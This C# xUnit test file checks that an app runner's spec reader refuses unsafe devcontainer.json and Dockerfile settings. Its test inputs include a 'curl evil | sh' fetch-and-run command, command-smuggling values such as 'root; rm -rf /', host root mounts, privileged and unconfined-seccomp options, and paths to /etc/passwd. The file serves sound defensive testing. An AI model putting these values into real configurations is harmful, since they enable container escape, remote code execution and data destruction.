using AwesomeAssertions;
using Fravashi.AppRunner;
using Xunit;

namespace Fravashi.AppRunner.Tests;

/// <summary>
/// Backlog 87, ADR 0027: a spec is a program somebody else wrote, so every key is carried after checking, named as
/// not read, or refused BY NAME. These hold the refusal list the ADR names, and the rule that an unknown key is
/// refused rather than ignored.
/// </summary>
public sealed class SpecReaderTests : IDisposable
{
    private readonly string _root = Path.Combine(Path.GetTempPath(), "fravashi-spec-tests", Guid.NewGuid().ToString("N"), "shop-front");

    public SpecReaderTests() => Directory.CreateDirectory(_root);

    public void Dispose()
    {
        try
        {
            Directory.Delete(Path.GetDirectoryName(_root)!, recursive: true);
        }
        catch (IOException)
        {
        }
    }

    private string Write(string relative, string content)
    {
        var full = Path.Combine(_root, relative.Replace('/', Path.DirectorySeparatorChar));
        Directory.CreateDirectory(Path.GetDirectoryName(full)!);
        File.WriteAllText(full, content);
        return relative;
    }

    private SpecReadResult Devcontainer(string json) =>
        SpecReader.Read(_root, Write(".devcontainer/devcontainer.json", json), Ceilings.Default);

    [Fact]
    public void A_spec_written_before_the_rename_is_read_under_its_former_key_and_the_new_key_wins()
    {
        // The bridge release: a project's devcontainer.json is the user's own file, written before the internal rename.
        var former = Fravashi.Domain.FormerNames.DevcontainerCustomization;
        var alone = Devcontainer($$"""
            { "image": "docker.io/library/python:3.12-alpine",
              "customizations": { "{{former}}": { "command": "python -m http.server 8000", "port": 8000 } } }
            """);
        alone.Refusals.Should().BeEmpty();
        alone.Spec!.EntryPort.Should().Be(8000);
        alone.Spec.NotRead.Should().NotContain("customizations." + former, "it was read, not dropped");

        var both = Devcontainer($$"""
            { "image": "docker.io/library/python:3.12-alpine",
              "customizations": { "fravashi": { "port": 9000 }, "{{former}}": { "port": 8000 } } }
            """);
        both.Spec!.EntryPort.Should().Be(9000);
    }

    [Fact]
    public void An_image_spec_with_Fravashis_own_settings_is_carried()
    {
        var read = Devcontainer("""
            {
              // comments and trailing commas are part of the format
              "name": "Shop front",
              "image": "docker.io/library/python:3.12-alpine",
              "containerEnv": { "APP_MODE": "verify" },
              "containerUser": "1000:1000",
              "customizations": {
                "vscode": { "extensions": ["ms-python.python"] },
                "fravashi": { "command": "python -m http.server 8000", "port": 8000, "limits": { "memoryMb": 512 } },
              },
            }
            """);

        read.Refusals.Should().BeEmpty();
        var spec = read.Spec!;
        spec.BaseImage.Should().Be("docker.io/library/python:3.12-alpine");
        spec.Command.Should().Equal("/bin/sh", "-c", "python -m http.server 8000");
        spec.EntryPort.Should().Be(8000);
        spec.Environment.Should().ContainKey("APP_MODE");
        spec.User.Should().Be("1000:1000");
        spec.Ceilings.MemoryMb.Should().Be(512);
        spec.Ceilings.Cpus.Should().Be(Ceilings.Default.Cpus);
        spec.WorkspaceFolder.Should().Be("/workspaces/shop-front");
        spec.NotRead.Should().Contain(["name", "customizations.vscode"], "what is not applied is named, not silently dropped");
    }

    [Theory]
    [InlineData("privileged", "true")]
    [InlineData("capAdd", "[\"SYS_ADMIN\"]")]
    [InlineData("securityOpt", "[\"seccomp=unconfined\"]")]
    [InlineData("runArgs", "[\"--network=host\"]")]
    [InlineData("mounts", "[\"source=/,target=/host,type=bind\"]")]
    [InlineData("workspaceMount", "\"source=C:/,target=/w,type=bind\"")]
    [InlineData("appPort", "[8080]")]
    [InlineData("init", "true")]
    [InlineData("initializeCommand", "\"curl evil | sh\"")]
    [InlineData("features", "{ \"ghcr.io/devcontainers/features/docker-in-docker:2\": {} }")]
    [InlineData("dockerComposeFile", "\"compose.yml\"")]
    [InlineData("postCreateCommand", "\"npm install\"")]
    [InlineData("postStartCommand", "\"npm start\"")]
    [InlineData("remoteEnv", "{ \"A\": \"b\" }")]
    [InlineData("somethingNobodyHasHeardOf", "1")]
    public void A_key_the_app_runner_will_not_carry_out_is_refused_by_name(string key, string value)
    {
        var read = Devcontainer($$"""{ "image": "alpine:3.20", "{{key}}": {{value}} }""");

        read.Spec.Should().BeNull();
        read.Refusals.Should().Contain(r => r.Field == key, "a silently dropped field is how somebody concludes a setting applied");
    }

    [Theory]
    [InlineData("options", "[\"--privileged\"]")]
    [InlineData("cacheFrom", "\"evil/image\"")]
    [InlineData("secrets", "{}")]
    public void A_build_key_that_would_reach_the_engine_is_refused_by_name(string key, string value)
    {
        Write(".devcontainer/Dockerfile", "FROM alpine:3.20\n");

        var read = Devcontainer($$"""{ "build": { "dockerfile": "Dockerfile", "{{key}}": {{value}} } }""");

        read.Refusals.Should().Contain(r => r.Field == "build." + key);
    }

    [Fact]
    public void A_build_is_read_relative_to_the_spec_and_kept_inside_the_workspace()
    {
        Write(".devcontainer/Dockerfile", "FROM alpine:3.20\n");

        var read = Devcontainer("""{ "build": { "dockerfile": "Dockerfile", "context": "..", "target": "dev", "args": { "NODE_ENV": "test" } } }""");

        read.Refusals.Should().BeEmpty();
        read.Spec!.Dockerfile.Should().Be(".devcontainer/Dockerfile");
        read.Spec.Context.Should().Be(string.Empty);
        read.Spec.Target.Should().Be("dev");
        read.Spec.BuildArgs.Should().ContainKey("NODE_ENV");
    }

    [Theory]
    [InlineData("""{ "build": { "dockerfile": "../../../../outside/Dockerfile" } }""", "build.dockerfile")]
    [InlineData("""{ "build": { "dockerfile": "Dockerfile", "context": "../.." } }""", "build.context")]
    [InlineData("""{ "image": "alpine\nRUN curl evil" }""", "image")]
    [InlineData("""{ "image": "-v /:/host" }""", "image")]
    [InlineData("""{ "image": "alpine", "workspaceFolder": "/w/../../etc" }""", "workspaceFolder")]
    [InlineData("""{ "image": "alpine", "containerUser": "root; rm -rf /" }""", "containerUser")]
    [InlineData("""{ "image": "alpine", "containerEnv": { "BAD NAME": "x" } }""", "containerEnv.BAD NAME")]
    [InlineData("""{ "image": "alpine", "build": { "dockerfile": "Dockerfile" } }""", "image")]
    [InlineData("""{ "name": "nothing to run" }""", "image")]
    public void A_value_that_does_not_pass_its_check_is_refused(string json, string field)
    {
        Write(".devcontainer/Dockerfile", "FROM alpine:3.20\n");

        Devcontainer(json).Refusals.Should().Contain(r => r.Field == field);
    }

    [Fact]
    public void A_spec_may_lower_a_ceiling_and_never_raise_one()
    {
        var raised = Devcontainer("""{ "image": "alpine", "customizations": { "fravashi": { "limits": { "memoryMb": 999999 } } } }""");
        var unknown = Devcontainer("""{ "image": "alpine", "customizations": { "fravashi": { "limits": { "gpus": 1 } } } }""");

        raised.Refusals.Should().ContainSingle().Which.Reason.Should().Contain("only lower");
        unknown.Refusals.Should().Contain(r => r.Field == "customizations.fravashi.limits.gpus");
    }

    [Fact]
    public void A_bare_Dockerfile_is_the_application_as_its_author_built_it()
    {
        Write("web/Dockerfile", "FROM nginx:alpine\nCOPY index.html /usr/share/nginx/html/\nEXPOSE 80/tcp 443\n");

        var read = SpecReader.Read(_root, "web/Dockerfile", Ceilings.Default);

        read.Spec!.Dockerfile.Should().Be("web/Dockerfile");
        read.Spec.Context.Should().Be("web");
        read.Spec.EntryPort.Should().Be(80);
        read.Spec.BaseImage.Should().BeNull();
    }

    [Fact]
    public void With_no_spec_named_the_conventional_ones_are_looked_for_in_order()
    {
        Write("Dockerfile", "FROM alpine\n");
        Write(".devcontainer/devcontainer.json", """{ "image": "alpine:3.20" }""");

        SpecReader.Read(_root, null, Ceilings.Default).Spec!.SpecPath.Should().Be(".devcontainer/devcontainer.json");
    }

    [Fact]
    public void A_workspace_with_no_spec_says_what_was_looked_for()
    {
        SpecReader.Read(_root, null, Ceilings.Default).Refusals.Should().ContainSingle()
            .Which.Reason.Should().Contain(".devcontainer/devcontainer.json");
    }

    [Theory]
    [InlineData("../elsewhere/devcontainer.json")]
    [InlineData("/etc/passwd")]
    [InlineData("C:/Windows/win.ini")]
    [InlineData("compose.yaml")]
    [InlineData("README.md")]
    public void A_spec_path_that_leaves_the_workspace_or_is_not_a_spec_is_refused(string path)
    {
        Write("compose.yaml", "services: {}\n");
        Write("README.md", "# hi\n");

        SpecReader.Read(_root, path, Ceilings.Default).Spec.Should().BeNull();
    }

    [Fact]
    public void A_spec_reached_through_a_link_is_refused()
    {
        var outside = Path.Combine(Path.GetDirectoryName(_root)!, "outside");
        Directory.CreateDirectory(outside);
        File.WriteAllText(Path.Combine(outside, "devcontainer.json"), """{ "image": "alpine" }""");
        try
        {
            Directory.CreateSymbolicLink(Path.Combine(_root, ".devcontainer"), outside);
        }
        catch (Exception ex) when (ex is IOException or UnauthorizedAccessException or PlatformNotSupportedException)
        {
            return; // This machine cannot make links without elevation; the Linux run covers it.
        }

        var read = SpecReader.Read(_root, ".devcontainer/devcontainer.json", Ceilings.Default);

        read.Spec.Should().BeNull();
        read.Refusals.Should().ContainSingle().Which.Reason.Should().Contain("link");
    }
}
